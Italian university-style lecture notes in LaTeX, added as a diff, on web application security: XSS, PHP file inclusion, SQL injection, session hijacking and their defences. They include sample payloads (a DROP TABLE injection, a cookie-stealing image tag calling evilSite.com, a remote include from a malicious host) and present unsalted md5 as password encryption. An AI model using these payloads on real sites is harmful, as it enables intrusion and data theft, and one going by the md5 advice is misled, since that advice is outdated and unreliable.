@@ -1,0 +1,289 @@
+\chapter{Sicurezza sul Web}
+
+\section{Introduzione}
+
+Il \textbf{cyber crime} è un crimine che:
+
+\begin{enumerate}
+    \item Sfrutta computer e reti come strumenti.
+    \item Ha computer e reti come obiettivi.
+\end{enumerate}
+
+Secondo un report del 2014 del Ponemon Institute, il costo medio annualizzato dei cyber crime per 257 organizzazioni analizzate è stato di 7.6 milioni di dollari all'anno, con un intervallo tra 0.5 milioni e 61 milioni per azienda. Le organizzazioni più piccole hanno un costo pro-capite significativamente più alto rispetto alle grandi organizzazioni. Ogni anno gli attacchi dovuti a insider malevoli, denial of service e attacchi web-based rappresentano più del 55\% di tutti i costi per cyber crime.
+
+\section{Attacchi non-tecnici}
+
+Un \textbf{attacco non-tecnico} è mirato ad estorcere informazioni sensibili alle persone o a far compiere azioni che possono compromettere la sicurezza di un sistema.
+
+Esempio tipico: \textbf{phishing} basato su ingegneria sociale. L'ingegneria sociale sfrutta la pressione sociale per convincere le persone a rivelare informazioni riservate.
+
+Possibili difese:
+
+\begin{itemize}
+    \item Educazione degli utenti.
+    \item Regole interne.
+    \item Filtri per spam e danger.
+\end{itemize}
+
+\section{Attacchi tecnici}
+
+Un \textbf{attacco tecnico} è perpetrato ai danni di un sistema informatico, con lo scopo di acquisire dati sensibili o danneggiare il sistema (spesso sfruttandone le vulnerabilità).
+
+\subsection{Come sono possibili gli attacchi tecnici}
+
+I programmi, soprattutto se di grandi dimensioni, possono contenere errori (\emph{bugs}, ``bachi'') e alcuni errori possono rappresentare \textbf{falle di sicurezza}. Le falle di sicurezza rappresentano dei punti di ingresso per terze parti provenienti dall'esterno, alle quali è fornita la possibilità di acquisire dati o alterare il funzionamento dell'applicazione. Le falle di sicurezza rendono quindi possibili le \textbf{intrusioni}.
+
+\section{Intrusioni}
+
+\subsection{Definizione e motivazioni}
+
+Un'\textbf{intrusione} è un accesso non previsto a un programma, con lo scopo di prelevare dati nascosti o modificarne il funzionamento. Un esempio tipico è il furto di dati personali (documenti, credenziali per l'accesso, contatti e dati anagrafici) custoditi all'interno di database non protetti a sufficienza.
+
+Le motivazioni di un'intrusione possono essere varie: dalla sfida personale alla truffa vera e propria, al terrorismo.
+
+\subsection{Messa in sicurezza}
+
+Per ridurre la possibilità di intrusioni bisogna \emph{mettere in sicurezza} l'applicazione: per implementare un'applicazione web sicura sono necessari tempo ed energie, che spesso vengono invece spesi solo quando si presentano i problemi.
+
+La messa in sicurezza di un'applicazione dovrebbe invece seguire di pari passo la progettazione, per evitare di dover inserire successivamente costose e meno funzionali patch.
+
+\subsection{Tipi di attacchi e difese}
+
+Esistono diversi modi per attaccare un'applicazione web. Ne esamineremo alcuni esempi:
+
+\begin{enumerate}
+    \item Attacchi in fase di autenticazione.
+    \item Iniezioni di codice.
+    \item Furto di sessione.
+\end{enumerate}
+
+E per ciascuno alcune tecniche di difesa:
+
+\begin{enumerate}
+    \item Test audiovisivi.
+    \item Validazione dell'input.
+    \item Sicurezza della sessione.
+\end{enumerate}
+
+\section{Attacchi in fase di autenticazione}
+
+\subsection{Autenticazione}
+
+L'\textbf{autenticazione} è il processo tramite cui un programma verifica l'identità di un utente, computer o programma attraverso il controllo delle sue credenziali.
+
+\subsection{Tecniche di intrusione}
+
+\textbf{Brute force}: processo automatico per tentativi ed errori. Tramite la generazione casuale di stringhe o l'utilizzo di appositi dizionari, effettua reiterati tentativi per indovinare dati come username, password, numeri di carte di credito, ecc.
+
+\textbf{Autenticazione insufficiente}: vulnerabilità che dipende da una cattiva progettazione del sito. Per esempio:
+
+\begin{itemize}
+    \item Un'app web implementa un'area riservata inserendola in una cartella o in un file non linkato nella home, accessibile solo a chi ne conosce il percorso, senza altre protezioni.
+    \item A chi dimentica la password si chiedono alcuni dati personali inseriti in fase di registrazione (data di nascita, telefono, ecc.): ricavare queste informazioni è spesso relativamente facile.
+\end{itemize}
+
+\section{Iniezioni di codice}
+
+Le \textbf{iniezioni di codice} consistono nell'inserimento di codice che esegue operazioni anomale non previste dall'autore dell'applicazione.
+
+\subsection{Esempio 1: iniezioni HTML o JavaScript (XSS -- Cross-Site Scripting)}
+
+Immaginiamo un sito che chiede all'utente di scrivere una domanda e poi fornisce una nuova pagina con la domanda e la risposta (sì/no). Se nello script PHP leggiamo la domanda (\texttt{\$\_POST["question"]}) e la inseriamo, senza controlli, nella pagina di risposta al posto della domanda, è possibile inserire:
+
+\begin{itemize}
+    \item Codice HTML (facendo, ad esempio, comparire messaggi non voluti nella pagina di risposta).
+    \item Codice JavaScript, che verrà eseguito dal browser (causando, ad esempio, l'apertura di decine di pop-up windows).
+\end{itemize}
+
+\subsection{Esempio 2: iniezioni PHP}
+
+Immaginiamo un incauto passaggio di dati via GET:
+
+\begin{verbatim}
+http://sito_esempio/esempio.php?includi=previsto.php
+\end{verbatim}
+
+L'URL contiene il parametro \texttt{includi}, il cui valore è il percorso del file che contiene lo script da inserire nella pagina. All'interno di \texttt{esempio.php} il valore del parametro \texttt{includi} viene letto e inserito nella pagina senza alcun controllo:
+
+\begin{lstlisting}[language=PHP]
+include($_GET["includi"]);
+\end{lstlisting}
+
+Questo rende possibile inoculare, ad esempio, uno script malevolo residente su un sito esterno. Per farlo è sufficiente connettersi a:
+
+\begin{verbatim}
+http://sito_esempio/esempio.php?includi=
+http%3A%2F%2Fsito_malevolo.com%2Fmalevolo.php
+\end{verbatim}
+
+\subsection{Esempio 3: iniezioni SQL}
+
+L'utente inserisce nel form caratteri ``strani'', per esempio:
+
+\begin{verbatim}
+Username: ' OR ''='
+\end{verbatim}
+
+Se nella pagina PHP leggiamo i valori inseriti dall'utente e li usiamo senza alcun controllo per interrogare il database:
+
+\begin{lstlisting}[language=SQL]
+$query = "SELECT * FROM utenti WHERE username='' OR ''=''";
+\end{lstlisting}
+
+La query seleziona tutti i record della tabella! Se poi il risultato viene visualizzato (sempre senza controlli) sulla pagina inviata al browser come risposta, l'utente potrà visualizzare tutto il contenuto della tabella \texttt{utenti}.
+
+Se invece l'utente inserisce nel form qualcosa come:
+
+\begin{verbatim}
+Username: '; DROP TABLE utenti; --
+\end{verbatim}
+
+E nella pagina PHP i valori vengono usati senza controlli:
+
+\begin{lstlisting}[language=SQL]
+$query = "SELECT * FROM utenti WHERE
+          username=''; DROP TABLE utenti; --'";
+\end{lstlisting}
+
+Dopo la prima query (\texttt{SELECT...}) viene eseguita una \texttt{DROP TABLE} che cancella l'intera tabella \texttt{utenti} dal DB. Il \texttt{--} serve per assicurarsi che qualunque cosa segua venga interpretato come commento e quindi non eseguito.
+
+\section{Furto di sessione}
+
+\subsection{Terminazione insufficiente della sessione}
+
+Se il sito mantiene attivo il session ID a lungo (per esempio per non dover ripetere il login), un malintenzionato ha più tempo per ``rubare'' il session ID.
+
+\subsection{Session hijacking}
+
+Il \textbf{session hijacking} (dirottamento della sessione) è il furto del session ID di un utente collegato in quel momento, per operare al suo posto (ad esempio per accedere a dati o a sezioni riservate).
+
+Esempio di attacco: il sito \texttt{myPoorSite.com} è vulnerabile a attacchi XSS e subisce un'iniezione di codice JavaScript che:
+
+\begin{itemize}
+    \item Legge il session ID (\texttt{sID}) nel session cookie (i cookies sono accessibili da JavaScript tramite l'oggetto \texttt{document.cookie}).
+    \item Inserisce un'immagine ``finta'':
+    \begin{lstlisting}[language=HTML5]
+<img src=http://evilSite.com/badScript.php?id=sID>
+    \end{lstlisting}
+\end{itemize}
+
+Il browser contatta il sito \texttt{evilSite.com} (in particolare lo script \texttt{badScript.php}), inviandogli come parametro il session ID, che può essere usato per effettuare richieste apparentemente legittime al sito \texttt{myPoorSite.com} ``in nome dell'utente legittimo''.
+
+\section{Difese: test audiovisivi}
+
+Per cercare automaticamente le falle di un sistema vengono utilizzati programmi che effettuano un'analisi automatica dei punti vulnerabili (possono essere usati sia per intrusione, sia per la ricerca preventiva di possibili falle di sicurezza).
+
+Un esempio di difesa contro gli strumenti di analisi automatica e contro attacchi in fase di autenticazione con metodo brute force è il \textbf{CAPTCHA} (Completely Automated Public Turing test to tell Computers and Humans Apart).
+
+\subsection{Caratteristiche del CAPTCHA}
+
+Il CAPTCHA è basato sull'idea del \textbf{test di Turing}: porre domande che permettano di capire se l'interlocutore è un umano o una macchina.
+
+La forma più comune di CAPTCHA è \textbf{visiva}: vengono mostrati all'utente lettere e numeri distorti in modo da eludere gli OCR (Optical Character Recognition, programmi dedicati al riconoscimento di un'immagine contenente testo).
+
+Esistono anche forme di CAPTCHA \textbf{audio}.
+
+\subsection{CAPTCHA moderni}
+
+Recentemente sono stati sviluppati meccanismi un po' diversi (tendenzialmente più sicuri e meno frustranti per l'utente, anche se hanno ancora problemi di accessibilità): l'utente dichiara di non essere un robot spuntando una casella. Solo se il software di analisi dei rischi ha dei dubbi, propone all'utente la risoluzione di un test.
+
+I criteri di discriminazione tra umano e software (\emph{bot}) si basano su diversi parametri: indirizzo IP, cookies, tempo impiegato tra la spunta della casella e l'invio del modulo, tipo di movimento effettuato con il mouse per avvicinarsi alla checkbox, ecc.
+
+\section{Difese: validazione dell'input}
+
+\subsection{Introduzione}
+
+Uno dei punti più deboli di un'applicazione web è l'elaborazione dei dati forniti dall'utente in input (per esempio nei form): effettuare dei controlli sull'input è fondamentale.
+
+La \textbf{validazione} è il controllo dell'input fornito dall'utente. Può essere effettuata in vari modi.
+
+\subsection{Validazione client-side}
+
+La \textbf{validazione client-side} consiste nella verifica dei dati inseriti dall'utente prima del loro invio al server.
+
+Si può leggere e controllare quanto scritto dall'utente in un form utilizzando JavaScript, il DOM e HTML5. È utile soprattutto come supporto per l'utente (per esempio per il controllo del formato di date, email, ecc.), ma è \textbf{insufficiente per la sicurezza del sito}: un attaccante può sempre disabilitare JavaScript o costruire richieste HTTP direttamente.
+
+\subsection{Validazione server-side}
+
+La \textbf{validazione server-side} consiste nella verifica dei dati contenuti nell'HTTP request ricevuta dal server.
+
+Si possono leggere e controllare i dati inviati nell'HTTP request utilizzando PHP (o una qualunque altra tecnologia server-side). Per esempio, in PHP, la funzione \texttt{is\_numeric(n)} controlla che \texttt{n} sia un numero: si può usarla per accettare solo gli input numerici (per esempio nel caso di un numero di telefono).
+
+Validare le stringhe è una questione più complessa. Esistono due modi principali:
+
+\begin{enumerate}
+    \item \textbf{Filtrare l'inserimento di specifiche sequenze di caratteri} (come i tag HTML), eliminando o ri-codificando le parti della stringa potenzialmente dannose (approccio più permissivo).
+    \item \textbf{Accettare solo input che rispettino specifiche regole di formattazione} (approccio più restrittivo).
+\end{enumerate}
+
+\subsection{Ricodifica di caratteri speciali}
+
+\textbf{Funzioni di escape}: l'\emph{escape} consiste nell'anteposizione di un carattere di escape (generalmente il backslash \texttt{\textbackslash}) ad alcuni caratteri che hanno significati particolari (per esempio gli apici). La presenza del carattere di escape comunica all'interprete di non interpretare il carattere che segue.
+
+Per esempio, nel caso di iniezione SQL, utilizzando delle funzioni di escape sull'input fornito dall'utente nel form si evita di scrivere involontariamente una query dannosa:
+
+\begin{lstlisting}[language=PHP]
+$query = "SELECT * FROM utenti WHERE username = '".
+         mysql_real_escape_string($user)."';";
+\end{lstlisting}
+
+\textbf{Funzioni che ricodificano i caratteri speciali dell'HTML}:
+
+\begin{lstlisting}[language=PHP]
+$text = "<p>hello</p>";
+$clean_text = htmlspecialchars($text);
+// risultato: &lt;p&gt;hello&lt;/p&gt;
+\end{lstlisting}
+
+Queste funzioni proteggono dal Cross-Site Scripting (XSS).
+
+\subsection{Controlli restrittivi sul formato dell'input}
+
+Oltre a controllare la lunghezza delle stringhe in input, si può controllare che i dati (stringhe) appartengano a una \textbf{lista predefinita}. Per esempio, si può controllare che l'input appartenga alla whitelist:
+
+\begin{verbatim}
+lunedi', martedi', mercoledi', giovedi', venerdi'
+\end{verbatim}
+
+\subsection{Ulteriori precauzioni}
+
+Due importanti precauzioni come parziale difesa da iniezioni SQL:
+
+\begin{enumerate}
+    \item \textbf{Impostare i privilegi dell'utente} utilizzato per connettersi al database server dallo script, in modo tale che siano disabilitate le modifiche più invasive (come la cancellazione di una tabella). Questa è una difesa dai tentativi di manipolazione del database.
+    \item \textbf{Crittografare le password}: anziché archiviare la password come la scrive l'utente (es.\ \texttt{"pippo"}), la si archivia invocando prima una funzione che ricodifica la stringa:
+    \begin{lstlisting}[language=PHP]
+md5("pippo")
+// "9e671a46de6768789f03bf4eee8d56d0"
+    \end{lstlisting}
+\end{enumerate}
+
+\section{Difese: sicurezza della sessione}
+
+Per rendere il furto del session ID più difficile da realizzare e il session ID rubato più difficile da usare, esistono diverse tecniche:
+
+\begin{itemize}
+    \item \textbf{Utilizzare i cookies come mezzo di trasporto del session ID}, inibendo l'URL rewriting (per farlo occorre modificare la configurazione del Web Server).
+    \item \textbf{Usare HTTPS} (rende più sicuro il transito dei cookies).
+    \item \textbf{Controllare da dove arriva l'utente} quando richiede una pagina ``delicata''. Per esempio, all'accesso a una pagina di trasferimento di denaro, controllare che:
+    \begin{itemize}
+        \item Il sito visitato allo step precedente sia il mio (controllando il valore dell'HTTP referrer header, accessibile in PHP; \emph{nota: non molto affidabile}).
+        \item La pagina visitata allo step precedente sia quella prevista (per es.\ quella di login), controllando un token appositamente incluso nell'HTTP request proveniente da quella pagina.
+    \end{itemize}
+    \item \textbf{Rinegoziare il session ID} ogni volta che viene inizializzata una sessione (\emph{session regeneration}): la funzione \texttt{session\_regenerate\_id()} genera un nuovo session ID non prevedibile, ri-creando il cookie che ne contiene il valore.
+    \item \textbf{Ruotare il session ID}: simile alla session regeneration, ma la generazione del nuovo session ID avviene a ogni richiesta (HTTP request) effettuata dal client. È una soluzione molto sicura, ma ha alcuni problemi: impedisce il funzionamento del tasto back del browser (il back effettua una richiesta con un session ID non più valido, in quanto rinegoziato) e impedisce il funzionamento corretto di memoria cache o di proxy.
+\end{itemize}
+
+\section{Conclusioni}
+
+\begin{itemize}
+    \item La sicurezza è un aspetto che \textbf{non può essere trascurato}.
+    \item La maggioranza dei problemi di sicurezza delle applicazioni web è legata alla \textbf{validazione degli input}: impedire che quanto inserito dall'utente possa contenere stringhe dannose significa già aver reso un sito più sicuro.
+    \item La messa in sicurezza non è un'operazione semplice: bisogna cercare un compromesso tra:
+    \begin{itemize}
+        \item Le \textbf{funzionalità e l'usabilità} (che rischiano di venire compromesse da controlli troppo restrittivi).
+        \item La \textbf{sicurezza}.
+    \end{itemize}
+    \item Gli utenti sono pigri e spesso non vogliono dover risolvere un CAPTCHA a ogni accesso.
+    \item Le scelte di messa in sicurezza dipendono dal \textbf{tipo di applicazione} e dai \textbf{dati trattati}.
+\end{itemize}
